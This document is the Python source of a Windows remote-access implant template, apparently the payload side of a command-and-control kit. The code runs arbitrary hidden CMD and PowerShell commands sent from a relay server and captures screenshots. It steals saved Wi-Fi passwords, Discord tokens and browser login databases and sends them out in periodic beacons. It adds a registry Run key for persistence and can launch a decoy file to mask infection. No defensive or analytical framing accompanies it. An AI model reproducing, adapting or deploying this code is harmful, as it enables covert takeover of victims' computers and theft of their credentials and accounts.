# C2_Client/payload/template.py
import sys
import os
import time
import threading
import platform
import base64
import subprocess
import uuid
import requests
import json
import socket
import getpass
import random
import shutil
import sqlite3
import zipfile
import io
import re

# Attempt to import Windows-specific and other necessary libraries
try:
    import winreg
    import psutil
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import win32crypt
    import mss
    from PIL import Image
    LIBS_AVAILABLE = True
except ImportError:
    LIBS_AVAILABLE = False

# --- CONFIGURATION INJECTED BY BUILDER ---
RELAY_URL = '{{RELAY_URL}}'
C2_USER = '{{C2_USER}}'
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}

# --- Global State ---
SESSION_ID = str(uuid.uuid4())
TERMINATE_FLAG = threading.Event()
RESULTS_QUEUE = []
RESULTS_LOCK = threading.Lock()

# --- Helper Functions ---
def _run_command(command, shell_type="CMD"):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        if shell_type.upper() == "POWERSHELL":
            command = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command]
        result = subprocess.run(command, shell=(shell_type.upper() == "CMD"), capture_output=True, text=True, timeout=60, startupinfo=startupinfo, errors='ignore')
        return result.stdout.strip() if result.stdout else result.stderr.strip()
    except Exception as e:
        return f"Command execution failed: {str(e)}"

# --- Action Handlers ---
def _action_shell(params):
    command = params.get("command", "")
    shell_type = params.get("shell_type", "CMD")
    return {"status": "success", "data": _run_command(command, shell_type)}

def _action_screenshot(params):
    if not LIBS_AVAILABLE: return {"status": "error", "data": "Library mss not available."}
    try:
        with mss.mss() as sct:
            sct_img = sct.grab(sct.monitors[0]) # The whole virtual desktop
            img_bytes = io.BytesIO()
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            img.save(img_bytes, format='PNG')
            return {"status": "success", "data": base64.b64encode(img_bytes.getvalue()).decode()}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_system_info(params):
    try:
        return {"status": "success", "data": {
            "System": platform.system(), "Node Name": platform.node(),
            "Release": platform.release(), "Version": platform.version(),
            "Machine": platform.machine(), "Processor": platform.processor()
        }}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_hardware_info(params):
    if not LIBS_AVAILABLE: return {"status": "error", "data": "Library psutil not available."}
    try:
        cpu_info = f"{psutil.cpu_count(logical=True)} Cores @ {psutil.cpu_freq().max:.2f}MHz"
        ram_info = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
        disks = [f"{d.device} ({d.fstype}) {d.total / (1024**3):.2f}GB" for d in psutil.disk_partitions()]
        return {"status": "success", "data": {"CPU": cpu_info, "RAM": ram_info, "Disks": ", ".join(disks)}}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_running_processes(params):
    if not LIBS_AVAILABLE: return {"status": "error", "data": "Library psutil not available."}
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'username']):
            try: procs.append({"pid": p.info['pid'], "name": p.info['name'], "username": p.info['username'] or 'N/A'})
            except (psutil.NoSuchProcess, psutil.AccessDenied): continue
        return {"status": "success", "data": procs}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_network_info(params):
    if not LIBS_AVAILABLE: return {"status": "error", "data": "Library psutil not available."}
    try:
        addrs = psutil.net_if_addrs()
        info = {}
        for iface, snics in addrs.items():
            info[iface] = [s.address for s in snics if s.family == socket.AF_INET]
        return {"status": "success", "data": info}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_wifi_passwords(params):
    try:
        profiles_data = _run_command("netsh wlan show profiles")
        profile_names = [line.split(":")[1].strip() for line in profiles_data.split("\n") if "All User Profile" in line]
        passwords = []
        for name in profile_names:
            profile_info = _run_command(f'netsh wlan show profile "{name}" key=clear')
            password = [line.split(":")[1].strip() for line in profile_info.split("\n") if "Key Content" in line]
            passwords.append({"SSID": name, "Password": password[0] if password else "None"})
        return {"status": "success", "data": passwords}
    except Exception as e: return {"status": "error", "data": str(e)}
    
def _action_discord_tokens(params):
    try:
        roaming, local = os.getenv('APPDATA'), os.getenv('LOCALAPPDATA')
        paths = {'Discord': os.path.join(roaming, 'discord', 'Local Storage', 'leveldb')}
        tokens = []
        for path in paths.values():
            if not os.path.exists(path): continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
                for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                        if token not in tokens: tokens.append(token)
        return {"status": "success", "data": tokens}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_browser_files(params):
    try:
        roaming, local = os.getenv('APPDATA'), os.getenv('LOCALAPPDATA')
        paths_to_check = {
            "Chrome": os.path.join(local, 'Google', 'Chrome', 'User Data'),
            "Edge": os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
            "Brave": os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            "Opera": os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        }
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for browser, path in paths_to_check.items():
                if not os.path.exists(path): continue
                login_data_path = os.path.join(path, 'Default', 'Login Data')
                local_state_path = os.path.join(path, 'Local State')
                if os.path.exists(login_data_path): zf.write(login_data_path, arcname=f"{browser}_Login_Data")
                if os.path.exists(local_state_path): zf.write(local_state_path, arcname=f"{browser}_Local_State")
        return {"status": "success", "data": {"data": base64.b64encode(zip_buffer.getvalue()).decode()}}
    except Exception as e: return {"status": "error", "data": str(e)}

# --- Main Logic ---
def execute_command(command_data):
    if not LIBS_AVAILABLE:
        result_payload = {"command": command_data.get('action'), "output": {"status": "error", "data": "Required Python libraries not found on target."}}
        with RESULTS_LOCK: RESULTS_QUEUE.append(result_payload)
        return

    action = command_data.get('action'); params = command_data.get('params', {})
    handler_func = getattr(sys.modules[__name__], f"_action_{action}", None)
    
    output = {"status": "error", "data": f"Unsupported or unimplemented action: {action}"}
    if callable(handler_func):
        try: output = handler_func(params)
        except Exception as e: output = {"status": "error", "data": f"Handler for '{action}' failed: {e}"}
    
    result_payload = {"command": action, "output": output, "response_id": command_data.get("response_id")}
    with RESULTS_LOCK: RESULTS_QUEUE.append(result_payload)

def command_and_control_loop():
    initial_metadata = {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{platform.system()} {platform.release()}"}
    
    while not TERMINATE_FLAG.is_set():
        try:
            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER, **initial_metadata}
            with RESULTS_LOCK:
                if RESULTS_QUEUE: heartbeat_data["results"] = RESULTS_QUEUE[:]; RESULTS_QUEUE.clear()

            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40)
            
            if response.status_code == 200:
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        
        except requests.exceptions.RequestException: pass
        except Exception: pass
        time.sleep(random.randint(8, 15))

def setup_persistence():
    if not PERSISTENCE_ENABLED or not hasattr(sys, 'frozen'): return
    try:
        exe_path = sys.executable
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "TetherC2Service", 0, winreg.REG_SZ, f'"{exe_path}"')
    except Exception as e: print(f"Failed to set persistence: {e}")

def run_decoy():
    if not DECOY_ENABLED or not DECOY_FILENAME: return
    try:
        temp_dir = os.environ.get("TEMP", ".")
        decoy_path = os.path.join(temp_dir, DECOY_FILENAME)
        with open(decoy_path, 'wb') as f:
            f.write(base64.b64decode(DECOY_DATA_B64))
        os.startfile(decoy_path)
    except Exception as e: print(f"Failed to run decoy: {e}")

def show_startup_popup():
    if not POPUP_ENABLED: return
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, POPUP_MESSAGE, POPUP_TITLE, 0x40) # 0x40 is MB_ICONINFORMATION
    except Exception as e: print(f"Failed to show popup: {e}")

if __name__ == "__main__":
    show_startup_popup()
    run_decoy()
    setup_persistence()
    
    main_c2_thread = threading.Thread(target=command_and_control_loop, daemon=True)
    main_c2_thread.start()
    
    try:
        while True: time.sleep(60)
    except KeyboardInterrupt:
        TERMINATE_FLAG.set()